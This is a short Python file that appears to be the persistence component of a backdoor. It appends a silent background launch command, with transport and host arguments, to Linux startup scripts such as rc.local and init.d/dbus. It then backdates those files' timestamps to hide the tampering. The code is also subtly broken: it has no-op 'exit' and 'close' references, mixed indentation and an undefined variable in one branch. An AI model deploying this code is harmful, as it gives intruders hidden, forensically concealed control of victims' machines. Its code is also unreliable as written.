#!/usr/bin/env python
import os

def add(path, mode, transport, host):
    if os.path.isfile("/etc/init.d/rc.local")==True:
        if path in open("/etc/init.d/rc.local").read():
            exit
        else:
            with open("/etc/init.d/rc.local", "a") as local:
                local.write(path+" "+mode+" --transport "+transport+" --host "+host+' > /dev/null 2>&1 &')
                local.close
            os.utime("/etc/init.d/rc.local",(1330712292,1330712292))
    elif os.path.isfile("/etc/rc")==True:
        if path in open("/etc/rc").read():
            exit
        else:
            os.system("head -n-1 /etc/rc > /etc/rc2 && rm -f /etc/rc && mv /etc/rc2 /etc/rc")
            with open("/etc/rc", "a") as rc:
                rc.write(path+" "+mode+" --transport "+transport+" --host "+host+' > /dev/null 2>&1 &'+'\n')
                rc.write("exit 0")
                rc.close
            os.utime("/etc/rc",(1330712292,1330712292))
    elif os.path.isfile("/etc/rc.d/rc.local")==True:
	if path in open("/etc/rc.d/rc.local").read():
	    exit
	else:
	    with open("/etc/rc.d/rc.local", "a") as rc2:
		rc2.write(path+" "+mode+" --transport "+transport+" --host "+host+' > /dev/null 2>&1 &')
		rc2.close()
		os.system("chmod +x /etc/rc.d/rc.local")
	    os.utime("/etc/rc.d/rc.local",(1330712292,1330712292))
    elif os.path.isfile("/etc/init.d/dbus")==True:
        if path in open("/etc/init.d/dbus").read():
            exit
        else:
            with open("/etc/init.d/dbus", "a") as dbus:
                cron.write(path+" "+mode+" --transport "+transport+" --host "+host+' > /dev/null 2>&1 &'+'\n')
                cron.close
            os.utime("/etc/init.d/dbus",(1330712292,1330712292))
